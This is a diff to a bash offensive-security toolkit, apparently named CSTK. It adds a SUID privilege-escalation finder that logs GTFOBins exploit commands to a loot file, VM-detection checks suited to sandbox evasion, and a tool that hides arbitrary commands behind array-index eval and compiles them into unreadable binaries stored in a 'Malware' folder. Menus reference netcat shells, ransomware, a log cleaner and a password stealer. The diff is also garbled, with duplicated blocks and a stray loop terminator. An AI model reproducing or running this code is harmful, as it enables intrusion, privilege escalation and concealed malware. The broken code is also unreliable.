@@ -70,7 +70,6 @@ auto_vuln_find="$bin/auto_vuln_finder"
 log_clean_bin="$bin/log_cleaner"
 # lib folders files used for copy/paste to create mostly payloads and ransomware
 lib="$home_dir/lib"
-
 NetcatBindShell="$lib/NetcatBindShell"
 ncbo="$lib/NetcatBindShell-X-encoded"
 ncb="$lib/HCDOUNASIXNTM7Q3YR-X-encoded.enc"
@@ -239,12 +238,12 @@ echo -e "\n\n\n $b
 
 # Make sure we are root and the install.sh script has been ran
 check_root() {
+
     if [[ "$EUID" -ne 0 ]]; then
 	    echo -e "sudo or root needed to run script"
 	    exit 1
     fi
 }
-
 
 A="${p}CSTK ==> ${x}"
 AO="${c}CSTK->OSINT ==> ${x}"
@@ -257,6 +256,7 @@ AE="${c}CSTK->ETC ==> ${x}"
 ae="${p}CSTK->ETC->"
 # Main Page when calling script with out any arguements
 function main_menu() {
+
 A="CSTK ==> "
 clear
 logo_main2
@@ -373,6 +373,7 @@ case "$1" in
         *) main_menu ;;
 esac
 echo
+
 read -r -n 1 -p "${r} ${A} ${x}" choice
 execute_tool "$1" "$choice"
 }
@@ -438,6 +439,7 @@ esac
 }
 
 # Bad option function for tool numbered choices
+
 error_font() {
     logo_error
     echo -e "$r \nBad Option: Returning to Main Menu \n $x "
@@ -459,17 +461,17 @@ getip() {
         echo -e "$c\nEnter the IP address to use. Options are: \n ${ARRAY[*]} $x"
         read -r -p "${g} ${A} ${x}" chosen_ip
 
-        # Verify the chosen IP is either in the list or a valid format
-        if [[ "$chosen_ip" != "$X_ip" && "$chosen_ip" != "$L_ip" ]]; then
-            if ! [[ "$chosen_ip" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]]; then
-                if [[ "$chosen_ip" =~ ^[Oo] ]]; then   # Check for "Other", "other", "O", "o"
-                    read -r -p "${g}Enter the IP address manually: ${x}" chosen_ip
-                else
-                    echo -e "$r\nInvalid IP address format. $x"
-                    exit 3
-                fi
+    # Verify the chosen IP is either in the list or a valid format
+    if [[ "$chosen_ip" != "$X_ip" && "$chosen_ip" != "$L_ip" ]]; then
+        if ! [[ "$chosen_ip" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]]; then
+            if [[ "$chosen_ip" =~ ^[Oo] ]]; then   # Check for "Other", "other", "O", "o"
+                read -r -p "${g}Enter the IP address manually: ${x}" chosen_ip
+            else
+                echo -e "$r\nInvalid IP address format. $x"
+                exit 3
             fi
         fi
+
         clear
         # User selects port number
         echo -e "$c Enter port number to use if needed. (1-65535): $x"
@@ -490,9 +492,21 @@ getip() {
                 fi
         done
     done
-    declare -g chosen_ip="$chosen_ip"
-    declare -g chosen_port="$chosen_port"
-    echo -e ""
+    clear
+    echo -e "\n$c You have selected IP and PORT: $chosen_ip:$chosen_port $x\n"
+    echo -e "$c Is this Correct? Y/N $x\n"
+    read -r -p "${c}==> ${x}" ans
+    while ! [[ "$ans" =~ [YyNn] ]]; do
+            echo -e "$r Invalid input. Please enter Y or N. $x"
+            read -r -p "Enter Y/N: " ans
+            if [[ "$ans" =~ [Nn] ]]; then
+                break
+            fi
+    done
+done
+declare -g chosen_ip="$chosen_ip"
+declare -g chosen_port="$chosen_port"
+echo -e ""
 
 }
 
@@ -530,7 +544,7 @@ find_that_ip() {
     	echo -e "\n\nDate and Time: $DATE \nUser Name: $USER \nScript Ran: IP Searcher \nSearched IP: $Ip \nResults: Failed to retrieve information." >> "$Loot/IP-Lookup.txt"
     fi
 
-    wait_and_return
+wait_and_return
 }
 
 # Class:OSINT - Tool:Ping Sweeper - Option 2 (Wrapper used)
@@ -766,7 +780,6 @@ netcat_shells_reverse() {
     else
         wait_and_return
     fi
-
 }
 
 netcat_shells_assembly() {
@@ -1147,12 +1160,24 @@ check_vm() {
         fi
     }
 
-    # Check DMI information for VM-related product names
-    if  grep -qE "(VMware|VirtualBox|QEMU|KVM|Xen|Parallels|Microsoft)" /sys/class/dmi/id/product_name 2>/dev/null ||
-        grep -qE "(VMware|VirtualBox|QEMU|KVM|Xen|Parallels|Microsoft)" /sys/class/dmi/id/sys_vendor 2>/dev/null; then
-        echo "VM detected via DMI product name or sys_vendor."
+# Check DMI information for VM-related product names
+if  grep -qE "(VMware|VirtualBox|QEMU|KVM|Xen|Parallels|Microsoft)" /sys/class/dmi/id/product_name 2>/dev/null ||
+    grep -qE "(VMware|VirtualBox|QEMU|KVM|Xen|Parallels|Microsoft)" /sys/class/dmi/id/sys_vendor 2>/dev/null; then
+    echo "VM detected via DMI product name or sys_vendor."
+    exit_or_stay
+fi
+# Check CPU flags for hypervisor presence
+if grep -q "^flags.*hypervisor" /proc/cpuinfo; then
+    echo "VM detected via CPU hypervisor flag."
+    exit_or_stay
+fi
+# Check manufacturer name using dmidecode (requires root)
+if command -v dmidecode &>/dev/null; then
+    if dmidecode -s system-manufacturer 2>/dev/null | grep -qiE "(VMware|VirtualBox|QEMU|Xen|Microsoft)"; then
+        echo "VM detected via dmidecode system manufacturer."
         exit_or_stay
     fi
+
     # Check CPU flags for hypervisor presence
     if grep -q "^flags.*hypervisor" /proc/cpuinfo; then
         echo "VM detected via CPU hypervisor flag."
@@ -1307,12 +1332,45 @@ check_gtfob() {
     sleep 5
     # Ensure GTFOB.py is available
     if ! command -v python3 &> /dev/null || [ ! -f "$GTFOB" ]; then
-    echo -e "$r \nPython3 not found. Script failed to run $x"
-    exit 4
-
+        echo -e "$r \nPython3 not found. Script failed to run $x"
+        exit 4
     fi
-    # Variable to pull user's executable PATH's directories
-    IFS=':' read -r -a P <<< "$PATH"
+# Variable to pull user's executable PATH's directories
+IFS=':' read -r -a P <<< "$PATH"
+
+# Find files with SUID enabled in PATH directories, suppressing errors
+hazard=$(find "${P[@]}" -type f -perm -u+s -exec basename {} \; 2>/dev/null)
+
+# Fetch the list of GTFOBins entries, suppressing errors
+fix=$(python3 "$GTFOB" -s 2>/dev/null | tr -d '*"-,_|/\\)$' | tail -n +1 | tr ' ' "\n")
+
+# Use arrays for better handling
+readarray -t hazard_array <<< "$hazard"
+readarray -t fix_array <<< "$fix"
+
+# Find matching file names for privilege escalation
+solution=$(comm -12 <(printf '%s\n' "${hazard_array[@]}" | sort) <(printf '%s\n' "${fix_array[@]}" | sort))
+
+# Check if any solution found
+if [ -z "$solution" ]; then
+echo -e "$r Nothing Found $x"
+echo -e "Date and Time: $DATE \nUser's Name: $USER \nScript Ran: GTFOB - Privilege Escalation script to search for bad or misconfigured file permissions \nNO EXPLOITS FOUND. \n "   >> "$log/GTFOB.log"
+else
+echo -e "$r Found Possible Privilege Escalation Executable(s): $x"
+for sol in $solution; do
+    # Get the attack type and exploitation command
+    issue=$(python3 "$GTFOB" --bin "$sol" | grep "Attack Type:")
+    command=$(python3 "$GTFOB" --bin "$sol" | grep --after-context 10 "Code:")
+    if [ -n "$issue" ]; then
+        touch "$Loot/GTFOB.txt"
+        echo -e "$c PrivEx is in $r $sol $x" | tee -a "$Loot/GTFOB.txt"
+        echo -e "$c Maybe abused with exploit $r $issue $x" | tee -a "$Loot/GTFOB.txt"
+        echo -e "$c Can be exploited by running the command: $r $command $x" | tee -a "$Loot/GTFOB.txt"
+        echo -e "Date and Time: $DATE \nUser's Name: $USER \nScript Ran: GTFOB - Privilege Escalation script to search for bad or misconfigured file permissions \nFOUND: $sol \nABUSE: $issue \nEXPLOIT: $command"   >> "$log/GTFOB.log"
+    fi
+done
+fi
+
 
     # Find files with SUID enabled in PATH directories, suppressing errors
     hazard=$(find "${P[@]}" -type f -perm -u+s -exec basename {} \; 2>/dev/null)
@@ -1433,7 +1491,6 @@ linux_exploits_check() {
     fi
     rm "$linux_exploit_checker_bin"
     wait_and_return
-
 }
 
 # Class: POST EXPLOIT - Tool: Command on start up - Option 6
@@ -1610,25 +1667,24 @@ inmem_password_stealer() {
     wait_and_return
 }
 
-
 ############################# ETC ##########################################
 
 # Class: ETC - Tool: Users and Shells - Option 1 (AWK)
 users_and_shells() {
-    clear
-    etc_usershells_frame
-    LOOT_FILE="$Loot/users_and_shells.txt"
-    exec > >(tee -a "$LOOT_FILE") 2>&1
-    /usr/bin/awk -F: '
-    BEGIN {
-        printf("\n\n%s\n", "/etc/passwd accounts with login shells");
-        printf("%s\n", "------------------------------------------");
-    }
-    {
-        if ($7 ~ /sh/) { printf("%10s uses the shell %s\n", $1, $7); }
-    }
-    ' /etc/passwd
-    wait_and_return
+clear
+etc_usershells_frame
+LOOT_FILE="$Loot/users_and_shells.txt"
+exec > >(tee -a "$LOOT_FILE") 2>&1
+/usr/bin/awk -F: '
+BEGIN {
+    printf("\n\n%s\n", "/etc/passwd accounts with login shells");
+    printf("%s\n", "------------------------------------------");
+}
+{
+    if ($7 ~ /sh/) { printf("%10s uses the shell %s\n", $1, $7); }
+}
+' /etc/passwd
+wait_and_return
 }
 
     # Class: ETC - Tool: Python Web server - Option 2
@@ -1667,7 +1723,6 @@ py_web_server() {
     done
 
     wait_and_return
-
 }
 
 # Class: ETC - Tool: File Extractor - Option 3
@@ -1702,8 +1757,29 @@ extract_arch() {
     else
         echo -e "$r '$archive' is not a valid file $x"
     fi
+done
+echo -e "$c Enter archive full file path $x"
+read -e -r -p "${c}==> ${x}" archive
+if [ -f "$archive" ]; then
+    case $archive in
+        *.tar.bz2) tar -x -j -f "$archive" ;;
+        *.tar.gz) tar -x -z -f "$archive" ;;
+        *.bz2) bunzip2 "$archive" ;;
+        *.rar) unrar x "$archive" ;;
+        *.gz) gunzip "$archive" ;;
+        *.tar) tar -x -f "$archive" ;;
+        *.zip) unzip "$archive" ;;
+        *.Z) uncompress "$archive" ;;
+        *.deb) dpkg -x "$archive" . ;;
+        *.7z) 7z x "$archive" ;;
+        *.tar.wz) tar -x -f "$archive" ;;
+        *) echo -e "$r '$archive' cannot be extracted by archive $x" ;;
+    esac
+else
+    echo -e "$r '$archive' is not a valid file $x"
+fi
 
-    wait_and_return
+wait_and_return
 }
 
 # Class: ETC - Tool: openssl helper - Option 4 (Wrapper Used)
@@ -1770,7 +1846,65 @@ post_x_2_go() {
     else
         error_font
     fi
-    wait_and_return
+        wait_and_return
+}
+
+# Class: ETC - Tool: Array Encrypted Script - Option 8
+array_enc_script() {
+clear
+etc_array_frame
+# Define uppercase and lowercase arrays
+UF=( A B C D E F G H I J K L M N O P Q R S T U V W X Y Z )
+LF=( a b c d e f g h i j k l m n o p q r s t u v w x y z )
+# read command to convert
+echo -ne "\e[36mEnter a command to convert:\e[0m "
+read -r -p "==> " command
+# ask user for final script name
+echo -ne "\e[36mEnter a final script name:\e[0m "
+read -r -p "==> " name
+# convert each letter of $command to a array index
+result=""
+for (( i=0; i<${#command}; i++ )); do
+    char="${command:$i:1}"
+    # Convert to array index
+    if [[ "$char" =~ [A-Z] ]]; then
+        index=$(printf "%d" "'$char")
+        index=$((index - 65))
+        result+="\${UF[$index]}"
+    elif [[ "$char" =~ [a-z] ]]; then
+        index=$(printf "%d" "'$char")
+        index=$((index - 97))
+        result+="\${LF[$index]}"
+    else
+        # Preserve spaces, dots, etc. directly
+        result+="$char"
+    fi
+done
+
+echo -e "\n\e[35m==> Converted:\e[0m"
+# create the script.sh with the arrays
+cat << 'EOF' > script.sh
+#!/bin/bash
+
+UF=( A B C D E F G H I J K L M N O P Q R S T U V W X Y Z )
+LF=( a b c d e f g h i j k l m n o p q r s t u v w x y z )
+
+eval "XXXXX"
+EOF
+# cat the script.sh into a variable and replace eval "XXXXX" with eval "command" in array form
+template=$(cat script.sh | awk -v x="$result" '{gsub(/XXXXX/, x); print}')
+# echo the array correct script
+echo "$template" > script2.sh
+rm -f script.sh
+mv script2.sh "$Malware/script.sh"
+chmod 777 "$Malware/script.sh"
+echo -e "\n\e[34mDo you want to create a unreadable binary script ? y/n\e[0m"
+read -r -p "y=yes n=no ==> " ans
+[[ "$ans" =~ [Yy] ]] && shc -r -f "$Malware/script.sh" -o "$Malware/$name" && \
+ rm -f "$Malware/script.sh" "$Malware/script.sh.x.c" || \
+ mv "$Malware/script.sh" "$Malware/$name" && rm -f "$Malware/script.sh";
+echo -e "\n\e[35mScript is located at: $Malware/$name\e[0m"
+wait_and_return
 }
 
 # Class: ETC - Tool: Array Encrypted Script - Option 8
@@ -1841,6 +1975,7 @@ log_cleaning_tool() {
 
 ######################## MAIN SCRIPT #######################
 check_root
+
 # Check for any arguements and display the correct information
 # Script needs 2 arguements to run
 # If no arguemets then start in GUI mode
